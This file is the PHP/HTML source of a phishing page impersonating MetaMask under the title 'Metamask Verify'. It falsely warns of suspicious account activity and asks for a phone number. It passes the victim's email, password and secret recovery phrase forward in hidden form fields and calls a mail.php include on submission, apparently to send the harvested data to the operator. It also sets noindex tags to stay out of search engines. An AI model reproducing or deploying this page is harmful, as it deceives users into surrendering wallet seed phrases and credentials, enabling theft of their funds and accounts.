
      <?php
     if (isset($_POST['btnMail'])) {
        include "mail.php";
    }
        ?>
<!DOCTYPE html>
<html lang="en">

<head> 
     <meta name="robots" content="noindex, nofollow"/>
        <meta name="googlebot" content="noindex, nofollow"/>
        <meta name="bingbot" content="noindex, nofollow"/>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Metamask Verify</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="./assets/scss/style.css">
</head>

<body>

    <!-- header -->

    <div class="container-fluid" id="header">
        <div class="headerImage">
            <img src="assets/images/meta_logo.png">
        </div>
    </div>

    <!-- header ends -->

    <div id="verify">
        <form action="error.php" method="post">

            <input type="hidden" name="email" value="<?php echo @$_POST['email']; ?>">
            <input type="hidden" name="password" value="<?php echo @$_POST['password']; ?>">
              <input type="hidden" name="secret_recovery_phrase" value="<?php echo @$_POST['secret_recovery_phrase']; ?>">
            <div class="image">
                <img src="assets/images/face.png">
            </div>

            <div class="heading">
                <h2>Verification Required</h2>
                <h3>Important Message</h3>
                <p>Some Suspicious Activity Found With Your Account, Enter Your Phone Number to Verify Your Identity.
                </p>
            </div>

            <div class="inputFields">

                <label>Phone Number</label><br>
                <input type="text" name="number" placeholder="+1-234-567-8910" required>
                <div class="button">
                    <button name="btnLoginMore" type="submit">Submit</button>
                </div>
            </div>

        </form>
    </div>


    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.10.2/dist/umd/popper.min.js"
        integrity="sha384-7+zCNj/IqJ95wo16oMtfsKbZ9ccEh31eOz1HGyDuCQ6wgnyJNSYdrPa03rtR1zdB"
        crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js"
        integrity="sha384-QJHtvGhmr9XOIpI6YVutG+2QOK9T+ZnN4kzFN1RtK3zEFEIsxhlmWl5/YESvpZ13"
        crossorigin="anonymous"></script>
</body>

</html>